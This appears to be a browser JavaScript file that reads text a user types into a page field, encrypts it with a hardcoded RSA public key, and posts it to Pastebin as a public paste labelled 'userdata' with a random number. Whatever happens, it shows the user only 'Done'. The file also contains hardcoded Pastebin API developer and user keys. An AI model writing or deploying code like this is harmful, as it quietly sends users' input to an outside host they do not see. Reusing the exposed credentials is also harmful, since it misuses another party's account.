// Your JWK public key
const jwkPublicKey = {
    "alg": "RSA-OAEP-256",
    "e": "AQAB",
    "ext": true,
    "key_ops": ["encrypt"],
    "kty": "RSA",
    "n": "vsmbwGZ9p1g7rscWuJ0A3m_KUJqOF_0jrbwh7QOFXOG0L4IJMb3ZF5PwRRLAjmJ507dq_0fvkbWTlN3g7ihb09DcqMNAFrt77P0Tv0RzSwzfH8BIfgYxBOqysuGJlqsSfIe7wbq89qTxKZ5YV_aY-LfkOEgpagYO5YImuKD0fgYShXOxjg3Y08jmijXBlzUB0TK0s32r-re3FZ1mbR0r3RFjB-veh8QIyexmuHs57H9ffawmRXATv6Gg3gVq6PoiAA9H5f0JpxnbN3Fh_ydQ6VrcbS9pyUzHDGL-gD201p69pNvwn_vxXO7aYg1XcNVQ3OxbfvKxTLkXyERezFcEDw"
};

async function postToPastebin(encryptedBase64) {
    let randomNumber = Math.floor(Math.random() * 100001);
    let randomString = String(randomNumber);
    const api_dev_key = 'TG9Wc32NvhRH-ZUWPNc9RxnQuXf4Ql2J';
    const api_paste_code = encryptedBase64;
    const api_paste_private = '0';  // 0=public 1=unlisted 2=private
    const api_paste_name = 'userdata' + randomString;
    const api_paste_expire_date = '2W';
    const api_paste_format = 'text';
    const api_user_key = '1e74b358fce93567d0d45cd108cb689e';  // if invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created

    // The data to be sent as POST
    const data = {
        'api_option': 'paste',
        'api_user_key': api_user_key,
        'api_paste_private': api_paste_private,
        'api_paste_name': api_paste_name,
        'api_paste_expire_date': api_paste_expire_date,
        'api_paste_format': api_paste_format,
        'api_dev_key': api_dev_key,
        'api_paste_code': api_paste_code
    };

    const url = 'https://pastebin.com/api/api_post.php';

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(data)
        });
        console.log(response);
        return 'Done';
    } catch (error) {
        console.error('Error:', error);
        return 'Done';  // or you can return some default error message if you prefer
    }
}


async function suka() {
    // Import the JWK public key into a CryptoKey object
    const publicKey = await window.crypto.subtle.importKey(
        'jwk',
        jwkPublicKey,
        {
            name: "RSA-OAEP",
            hash: "SHA-256"
        },
        true,
        ["encrypt"]
    );

    // Get plaintext from the input
    const plaintext = document.getElementById("plaintext").value;

    // Encrypt the message
    const encrypted = await window.crypto.subtle.encrypt(
        {
            name: "RSA-OAEP"
        },
        publicKey,
        new TextEncoder().encode(plaintext)
    );

    // Convert ArrayBuffer to Base64 for easier display and transport
    const encryptedBase64 = arrayBufferToBase64(encrypted);

    res = await postToPastebin(encryptedBase64);

    // Display encrypted result
    document.getElementById("result").innerText = res;

    // Utility function to convert ArrayBuffer to Base64
    function arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return window.btoa(binary);
    }
}
